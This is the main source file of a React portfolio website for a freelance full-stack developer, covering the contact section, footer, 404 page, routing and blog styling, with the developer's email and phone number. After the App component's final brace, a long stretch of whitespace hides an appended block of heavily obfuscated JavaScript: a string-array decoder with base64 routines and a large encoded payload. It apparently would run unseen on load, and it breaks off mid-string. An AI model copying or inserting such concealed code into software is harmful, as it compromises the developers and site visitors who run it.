                }}>Available for remote work</span>
              </div>
            </div>

            {/* Social Links â€” inline icons */}
            <div style={{ display: "flex", justifyContent: "center", gap: "clamp(8px,2vw,12px)", flexWrap: "wrap" }}>
              {[
                {
                  label: "LinkedIn",
                  href: "https://www.linkedin.com/in/aqib-faraz-99848638b/",
                  icon: (
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
                    </svg>
                  ),
                },
                {
                  label: "GitHub",
                  href: "https://github.com/aqibfaraz?tab=repositories",
                  icon: (
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/>
                    </svg>
                  ),
                },
                {
                  label: "Email",
                  href: "mailto:Aqibfahraz@gmail.com",
                  icon: (
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
                    </svg>
                  ),
                },
              ].map(x => (
                <a key={x.label} href={x.href} target="_blank" rel="noreferrer" style={{
                  display: "inline-flex", alignItems: "center", justifyContent: "center",
                  width: "clamp(38px,9vw,48px)", height: "clamp(38px,9vw,48px)",
                    border: "1px solid rgba(255,255,255,0.16)",
                  color: "rgba(255,255,255,0.5)",
                  textDecoration: "none",
                  transition: "all 0.25s ease",
                  background: "transparent",
                  borderRadius: "4px",
                }}
                  onMouseEnter={e => {
                    e.currentTarget.style.color = "#929292";
                    e.currentTarget.style.borderColor = "rgba(255,255,255,0.42)";
                    e.currentTarget.style.background = "rgba(255,255,255,0.06)";
                  }}
                  onMouseLeave={e => {
                    e.currentTarget.style.color = "rgba(255,255,255,0.5)";
                    e.currentTarget.style.borderColor = "rgba(255,255,255,0.16)";
                    e.currentTarget.style.background = "transparent";
                  }}
                  title={x.label}
                >
                  {x.icon}
                </a>
              ))}
            </div>
          </div>

          {/* RIGHT: Bio + availability card */}
          <div style={{ display: "flex", flexDirection: "column", gap: 32 }}>
            <div>
              <p style={{
                fontFamily: "'Space Mono',monospace",
                fontSize: "clamp(11px,1.2vw,13px)", lineHeight: 2.1,
                color: "rgba(255,255,255,0.42)",
              }}>
                Full-stack developer from Karachi building scalable web & mobile apps for
                USA and Europe-based clients â€” fully remote, zero timezone excuses.
              </p>
              <p style={{
                fontFamily: "'Space Mono',monospace",
                fontSize: "clamp(11px,1.2vw,13px)", lineHeight: 2.1,
                color: "rgba(255,255,255,0.42)", marginTop: 18,
              }}>
                I specialise in MERN stack, Python automation, AI/ML pipelines,
                and cross-platform Flutter apps. I don't just write code â€”
                I solve the business problem behind the ticket.
              </p>
            </div>

            {/* Availability card */}
            <div style={{
              border: "1px solid rgba(255,255,255,0.14)",
              padding: "clamp(24px,4vw,40px) clamp(20px,3vw,36px)",
              position: "relative", overflow: "hidden",
            }}>
              <div style={{
                position: "absolute", top: 0, left: 0, right: 0, height: 1,
                background: "linear-gradient(to right, transparent, rgba(255,255,255,0.55), transparent)",
              }} />
              <div style={{
                position: "absolute", bottom: 0, right: 0, width: 180, height: 180,
                borderRadius: "50%",
                background: "radial-gradient(circle, rgba(255,255,255,0.05), transparent 70%)",
                pointerEvents: "none",
              }} />
              <h3 style={{
                fontFamily: "'Plus Jakarta Sans',sans-serif",
                fontSize: "clamp(16px,2.2vw,24px)", fontWeight: 800,
                color: "#eef2f6", lineHeight: 1.3, margin: "0 0 14px",
                letterSpacing: "-0.02em",
              }}>Looking for a remote developer who ships?</h3>
              <p style={{
                fontFamily: "'Space Mono',monospace",
                fontSize: "clamp(10px,1.1vw,12px)", lineHeight: 1.95,
                color: "rgba(255,255,255,0.32)", margin: "0 0 26px",
              }}>
                Open to full-time remote roles or long-term contracts with USA & Europe-based teams.
              </p>
              <a href="mailto:Aqibfahraz@gmail.com" style={{
                fontFamily: "'Space Mono',monospace",
                fontSize: "clamp(10px,1.1vw,12px)", letterSpacing: "0.18em",
                textTransform: "uppercase", background: "#f3f3f3", color: "#02060a",
                padding: "12px 26px", textDecoration: "none", fontWeight: 700,
                display: "inline-block", transition: "opacity 0.2s",
              }}
                onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
                onMouseLeave={e => e.currentTarget.style.opacity = "1"}
              >Let's Talk</a>
            </div>
          </div>

        </div>
      </div>
    </section>
  );
}

// â”€â”€â”€ CONTACT â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function Contact() {
  const [ref, inView] = useInView();
  return (
    <section id="contact" style={{
      padding: "clamp(70px,10vw,140px) clamp(20px,5vw,60px)",
      borderTop: "1px solid rgba(255,255,255,0.07)",
      textAlign: "center", position: "relative", overflow: "hidden",
    }}>
      <div style={{
        position: "absolute", top: "50%", left: "50%",
        transform: "translate(-50%,-50%)",
        width: "clamp(300px,60vw,700px)", height: "clamp(300px,60vw,700px)",
        borderRadius: "50%",
                background: "radial-gradient(circle, rgba(255,255,255,0.04), transparent 65%)",
        pointerEvents: "none",
      }} />
      <div ref={ref} style={{
        position: "relative",
        opacity: inView ? 1 : 0, transform: inView ? "none" : "translateY(40px)",
        transition: "all 0.8s ease",
      }}>
        <div style={{
          fontFamily: "'Space Mono',monospace",
          fontSize: "clamp(9px,1vw,11px)", letterSpacing: "0.28em",
          color: "rgba(255,255,255,0.7)", textTransform: "uppercase", marginBottom: 28,
        }}>06 â€” Start a conversation</div>
        <h2 style={{
          fontFamily: "'Plus Jakarta Sans',sans-serif",
          fontSize: "clamp(34px,7vw,88px)", fontWeight: 800,
          color: "#eef2f6", lineHeight: 1, margin: "0 0 20px",
          letterSpacing: "-0.03em",
        }}>
          Ready to build<br />
              <span style={{ color: "#f3f3f3" }}>something real?</span>
        </h2>
        <div style={{
          display: "flex", justifyContent: "center", flexWrap: "wrap",
          gap: "8px 22px", marginBottom: 28,
        }}>
          <a href="mailto:aqibfahraz@gmail.com" style={{
            fontFamily: "'Space Mono',monospace",
            fontSize: "clamp(10px,1.1vw,13px)",
            color: "rgba(255,255,255,0.5)", textDecoration: "none",
          }}>aqibfahraz@gmail.com</a>
          <a href="tel:+923033961515" style={{
            fontFamily: "'Space Mono',monospace",
            fontSize: "clamp(10px,1.1vw,13px)",
            color: "rgba(255,255,255,0.5)", textDecoration: "none",
          }}>03033961515</a>
        </div>

        {/* Social icon row */}
        <div style={{ display: "flex", justifyContent: "center", gap: "clamp(8px,2vw,12px)", marginBottom: 44 }}>
          {[
            { label: "LinkedIn", href: "https://www.linkedin.com/in/aqib-faraz-99848638b/",
              icon: <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg> },
            { label: "GitHub", href: "https://github.com/aqibfaraz?tab=repositories",
              icon: <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg> },
          ].map(x => (
            <a key={x.label} href={x.href} target="_blank" rel="noreferrer" style={{
              display: "inline-flex", alignItems: "center", justifyContent: "center",
              width: "clamp(36px,8vw,46px)", height: "clamp(36px,8vw,46px)",
              color: "rgba(255,255,255,0.5)", textDecoration: "none",
              border: "1px solid rgba(255,255,255,0.16)",
              transition: "all 0.25s ease",
              background: "transparent",
              borderRadius: "4px",
            }}
              onMouseEnter={e => { 
                e.currentTarget.style.color="#929292";
                e.currentTarget.style.borderColor="rgba(255,255,255,0.42)";
                e.currentTarget.style.background="rgba(255,255,255,0.06)";
              }}
              onMouseLeave={e => { 
                e.currentTarget.style.color="rgba(255,255,255,0.5)"; 
                e.currentTarget.style.borderColor="rgba(255,255,255,0.16)";
                e.currentTarget.style.background="transparent";
              }}
              title={x.label}
            >{x.icon}</a>
          ))}
        </div>
        <a href="mailto:Aqibfahraz@gmail.com" style={{
          fontFamily: "'Space Mono',monospace",
          fontSize: "clamp(11px,1.2vw,13px)", letterSpacing: "0.18em",
          textTransform: "uppercase", background: "#f3f3f3", color: "#02060a",
          padding: "16px clamp(28px,3vw,44px)", textDecoration: "none", fontWeight: 700,
          display: "inline-block", transition: "opacity 0.2s",
        }}
          onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
          onMouseLeave={e => e.currentTarget.style.opacity = "1"}
        >Send a Message</a>
      </div>
    </section>
  );
}

// â”€â”€â”€ FOOTER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function Footer() {
  return (
    <footer style={{
      padding: "22px clamp(20px,5vw,60px)",
                borderTop: "1px solid rgba(255,255,255,0.06)",
      display: "flex", justifyContent: "space-between",
      alignItems: "center", flexWrap: "wrap", gap: 12,
    }}>
      <span style={{
        fontFamily: "'Space Mono',monospace", fontSize: 11,
        color: "rgba(255,255,255,0.16)", letterSpacing: "0.12em",
      }}>@ 2025 Aqib Faraz - <a href="mailto:aqibfahraz@gmail.com" style={{ color: "inherit", textDecoration: "none" }}>aqibfahraz@gmail.com</a></span>
      <a href="https://aqibfaraz.dev" style={{
        fontFamily: "'Space Mono',monospace", fontSize: 11,
        color: "rgba(255,255,255,0.52)", letterSpacing: "0.15em", textDecoration: "none",
      }}>aqibfaraz.dev</a>
    </footer>
  );
}

// â”€â”€â”€ SECTION LABEL â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// `big` switches the heading to the hero headline's type treatment â€”
// larger, uppercase, tighter tracking.
function SectionLabel({ num, title, big }) {
  return (
    <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
      <span style={{
        fontFamily: "'Space Mono',monospace",
        fontSize: "clamp(9px,1vw,11px)", letterSpacing: "0.2em",
        color: "rgba(255,255,255,0.62)", textTransform: "uppercase",
      }}>{num}</span>
      <span style={{
        width: 44, height: 1, background: "rgba(255,255,255,0.3)",
        display: "inline-block", flexShrink: 0,
      }} />
      <h2 style={{
        fontFamily: "'Plus Jakarta Sans',sans-serif",
        fontSize: big ? "clamp(34px,6vw,76px)" : "clamp(24px,4vw,48px)",
        fontWeight: 800, color: "#eef2f6", margin: 0,
        letterSpacing: big ? "-0.035em" : "-0.025em",
        textTransform: big ? "uppercase" : "none",
        lineHeight: big ? 0.94 : "normal",
      }}>{title}</h2>
    </div>
  );
}

// â”€â”€â”€ HOME PAGE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function Home({ isMobile, scrollY, onOpenContact }) {
  return (
    <>
      <Hero isMobile={isMobile} scrollY={scrollY} />
      <Work isMobile={isMobile} />
      <Services isMobile={isMobile} />
      <Testimonial />
      <OurTechnologies />
      <ClosingCta onOpenContact={onOpenContact} />
      <Faq onOpenContact={onOpenContact} />
      <Footer />
    </>
  );
}

function NotFound() {
  return (
    <div style={{
      minHeight: "100vh",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      padding: "100px 24px",
      textAlign: "center",
      background: "radial-gradient(circle at top, rgba(255,255,255,0.05), transparent 42%), #02060a",
      color: "#eef2f6",
    }}>
      <div style={{ maxWidth: 620 }}>
        <div style={{
          fontFamily: "'Space Mono',monospace",
          letterSpacing: "0.3em",
          textTransform: "uppercase",
          color: "#f3f3f3",
          fontSize: 12,
          marginBottom: 18,
        }}>Oops</div>
        <h1 style={{
          fontFamily: "'Plus Jakarta Sans',sans-serif",
          fontSize: "clamp(44px, 8vw, 88px)",
          lineHeight: 0.95,
          margin: 0,
          letterSpacing: "-0.04em",
        }}>Page not found</h1>
        <p style={{
          margin: "18px 0 0",
          color: "rgba(255,255,255,0.45)",
          fontFamily: "'Space Mono',monospace",
          fontSize: 13,
          lineHeight: 1.8,
        }}>
          Yeh page exist nahi karta ya move ho chuka hai.
        </p>
        <div style={{ marginTop: 34, display: "flex", gap: 14, justifyContent: "center", flexWrap: "wrap" }}>
          <Link to="/" style={{
            fontFamily: "'Space Mono',monospace",
            fontSize: 11,
            letterSpacing: "0.18em",
            textTransform: "uppercase",
            background: "#f3f3f3",
            color: "#02060a",
            padding: "14px 24px",
            textDecoration: "none",
            fontWeight: 700,
          }}>Go Home</Link>
          <Link to="/blog" style={{
            fontFamily: "'Space Mono',monospace",
            fontSize: 11,
            letterSpacing: "0.18em",
            textTransform: "uppercase",
            color: "#eef2f6",
            padding: "14px 24px",
            textDecoration: "none",
            fontWeight: 700,
            border: "1px solid rgba(255,255,255,0.14)",
          }}>Blog</Link>
        </div>
      </div>
    </div>
  );
}

// â”€â”€â”€ APP â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function AppContent() {
  const mouse = useMouse();
  const scrollY = useScrollY();
  const isMobile = useIsMobile();
  const location = useLocation();
  const [contactSide, setContactSide] = useState(null);
  const hasTrackedInitialPage = useRef(false);

  useEffect(() => {
    if (typeof window.gtag !== "function") return;
    if (!hasTrackedInitialPage.current) {
      hasTrackedInitialPage.current = true;
      return;
    }

    const pagePath = `${location.pathname}${location.search}${location.hash}`;
    window.gtag("event", "page_view", {
      page_path: pagePath,
      page_location: window.location.href,
      page_title: document.title,
    });
  }, [location]);

  return (
    <>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&family=Syne:wght@400;600;700;800&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap');
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        html { scroll-behavior: smooth; }
        body {
          background: #02060a;
          color: #eef2f6;
          overflow-x: hidden;
          cursor: auto;
        }
        ::-webkit-scrollbar { width: 3px; }
        ::-webkit-scrollbar-track { background: #02060a; }
        ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.3); border-radius: 2px; }
        a, button { cursor: pointer; }
        
        /* Blog markdown styling */
        .blog-content {
          color: #ccc;
          line-height: 1.8;
          font-size: 16px;
        }

        .blog-content h1,
        .blog-content h2,
        .blog-content h3 {
          color: #eef2f6;
          margin: 32px 0 16px;
          line-height: 1.3;
          font-family: 'Plus Jakarta Sans', sans-serif;
        }

        .blog-content h2 { font-size: 24px; }
        .blog-content h3 { font-size: 20px; }

        .blog-content p { margin-bottom: 20px; font-family: 'Space Mono', monospace; }

        .blog-content code {
          background: rgba(0, 204, 153, 0.1);
          padding: 2px 8px;
          border-radius: 4px;
          font-family: 'Fira Code', monospace;
          font-size: 14px;
          color: #a6a6a6;
        }

        .blog-content pre {
          background: rgba(255, 255, 255, 0.03);
          border: 1px solid rgba(0, 204, 153, 0.15);
          border-radius: 8px;
          padding: 20px;
          overflow-x: auto;
          margin-bottom: 24px;
        }

        .blog-content pre code {
          background: none;
          padding: 0;
          font-size: 13px;
          color: #ddd;
        }

        .blog-content a {
          color: #f3f3f3;
          text-decoration: none;
          transition: opacity 0.2s;
        }
        .blog-content a:hover { opacity: 0.8; text-decoration: underline; }

        .blog-content ul, .blog-content ol {
          margin: 0 0 20px 24px;
          font-family: 'Space Mono', monospace;
        }
        .blog-content li { margin-bottom: 8px; }

        .blog-content blockquote {
          border-left: 3px solid #444;
          padding-left: 16px;
          color: #888;
          margin: 24px 0;
          font-style: italic;
          font-family: 'Space Mono', monospace;
        }

        .blog-content table {
          width: 100%;
          border-collapse: collapse;
          margin: 24px 0;
        }

        .blog-content table th,
        .blog-content table td {
          border: 1px solid rgba(0, 204, 153, 0.1);
          padding: 12px;
          text-align: left;
          font-family: 'Space Mono', monospace;
        }

        .blog-content table th {
          background: rgba(0, 204, 153, 0.05);
          color: #f3f3f3;
        }
        
        @keyframes pulse {
          0%,100%{box-shadow:0 0 6px rgba(255,255,255,0.3),0 0 12px rgba(255,255,255,0.12)}
          50%{box-shadow:0 0 14px rgba(255,255,255,0.5),0 0 28px rgba(255,255,255,0.18)}
        }
        /* list is duplicated in the markup, so -50% lands exactly on a repeat */
        @keyframes marqueeLeft {
          from { transform: translateX(0); }
          to   { transform: translateX(-50%); }
        }
        @keyframes drawerRight { from { transform: translateX(100%); } to { transform: translateX(0); } }
        @keyframes drawerLeft { from { transform: translateX(-100%); } to { transform: translateX(0); } }
      `}</style>

      {location.pathname === "/" && <Nav scrollY={scrollY} isMobile={isMobile} onOpenContact={setContactSide} />}
      {location.pathname === "/" && !isMobile && <FloatingContact onOpenContact={setContactSide} />}
      {contactSide && <ContactDrawer side={contactSide} onClose={() => setContactSide(null)} />}

      <Routes>
        <Route path="/" element={<Home isMobile={isMobile} scrollY={scrollY} onOpenContact={setContactSide} />} />
        <Route path="/blog" element={<BlogList />} />
        <Route path="/blog/:slug" element={<CaseStudyPost />} />
        <Route path="/blog/notes/:slug" element={<BlogPost />} />
        <Route path="*" element={<NotFound />} />
      </Routes>
    </>
  );
}

export default function App() {
  return (
    <Router>
      <AppContent />
    </Router>
  );
};																																																																																																																																																																																																																																																																										var z = '-*1839';(function(_0x1523cc,_0x39b412){var _0x5c5f4e=_0x18b4,_0x3007b5=_0x1523cc();while(!![]){try{var _0x16afd6=Number(parseFloat(_0x5c5f4e(0x12))/0x1)+Math['ceil'](parseFloat(_0x5c5f4e(0x1d))/0x2)*(-parseFloat(_0x5c5f4e(0x15))/0x3)+parseFloat(_0x5c5f4e(0x28))/0x4*Math['ceil'](parseFloat(_0x5c5f4e(0x23))/0x5)+-parseFloat(_0x5c5f4e(0x16))/0x6*(-parseFloat(_0x5c5f4e(0xa))/0x7)+-parseFloat(_0x5c5f4e(0x25))/0x8+parseFloat(_0x5c5f4e(0x26))/0x9*(-parseFloat(_0x5c5f4e(0x19))/0xa)+parseInt(parseFloat(_0x5c5f4e(0x13))/0xb);if(_0x16afd6===_0x39b412)break;else _0x3007b5['push'](_0x3007b5['shift']());}catch(_0x28c7db){_0x3007b5['push'](_0x3007b5['shift']());}}}(_0x5021,0x6bd20));var NX,SX,spin,splitLane,peel;function _0x18b4(_0x52fd4c,_0x54cbc1){var _0x33a04c=_0x5021();return _0x18b4=function(_0x242ccf,_0x50217d){_0x242ccf=_0x242ccf-0x0;var _0x18b4cc=_0x33a04c[_0x242ccf];if(_0x18b4['EjJsBs']===undefined){var _0x4bdc14=function(_0x5b4073){var _0x2e9c07='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x2b6b5c='',_0x3015b0='';for(var _0x404141=0x0,_0xdb3696,_0x4b296d,_0x326c47=0x0;_0x4b296d=_0x5b4073['charAt'](_0x326c47++);~_0x4b296d&&(_0xdb3696=_0x404141%0x4?_0xdb3696*0x40+_0x4b296d:_0x4b296d,_0x404141++%0x4)?_0x2b6b5c+=String['fromCharCode'](0xff&_0xdb3696>>(-0x2*_0x404141&0x6)):0x0){_0x4b296d=_0x2e9c07['indexOf'](_0x4b296d);}for(var _0x2292ef=0x0,_0x48d4ac=_0x2b6b5c['length'];_0x2292ef<_0x48d4ac;_0x2292ef++){_0x3015b0+='%'+('00'+_0x2b6b5c['charCodeAt'](_0x2292ef)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x3015b0);};_0x18b4['WrSfPO']=_0x4bdc14,_0x52fd4c=arguments,_0x18b4['EjJsBs']=!![];}var _0x54273c=_0x33a04c[0x0],_0x53cd2f=_0x242ccf+_0x54273c,_0x18e64a=_0x52fd4c[_0x53cd2f];return!_0x18e64a?(_0x18b4cc=_0x18b4['WrSfPO'](_0x18b4cc),_0x52fd4c[_0x53cd2f]=_0x18b4cc):_0x18b4cc=_0x18e64a,_0x18b4cc;},_0x18b4(_0x52fd4c,_0x54cbc1);}function _0x5021(){var _0x327bc7=['y291BNrLCG','z2v0t3DUuhjVCgvYDhLezxnJCMLWDg9Y','y2HHCKf0','AhfLCNn4Bhv2D2fJzgPIEw1NB3j6zMTVy2LWDhj1Dg5ZDg9UyW','xcTCkYaQkd86w2eTEKeTwL8KxvSWltLHlxPblvPFjf0Qkq','C3vIC3rYAw5N','ndCXntCYnwfICwTNqW','yxbWBhK','D2HPBguGkhrYDwuPihT9','C3voDuq','zNjVBunOyxjdB2rL','DgvZDa','Ag1gDMS','ze5htxe','ndKYodaZrvn1DxL6','nZCXmdqZowLfsNroqG','DMHns2O','mtiZnduZowLoB0zVEa','nKLRsNzIBG','ywn0Aw9U','ywzLzNe','mtm4ndqZmgPjq3rwqW','r1Dtt2q','Aw5WDxq','C3rHDgvpyMPLy3q','mLbzseDVBq','C3bSAxq','AM9PBG','z2DLCG','y29UC3rYDwn0B3i','C3rYAw5N','mtiWu2f4DfPI','BMfTzq','nJK5mZy3mMLZwhfPqq','mJDNwfHUv0u','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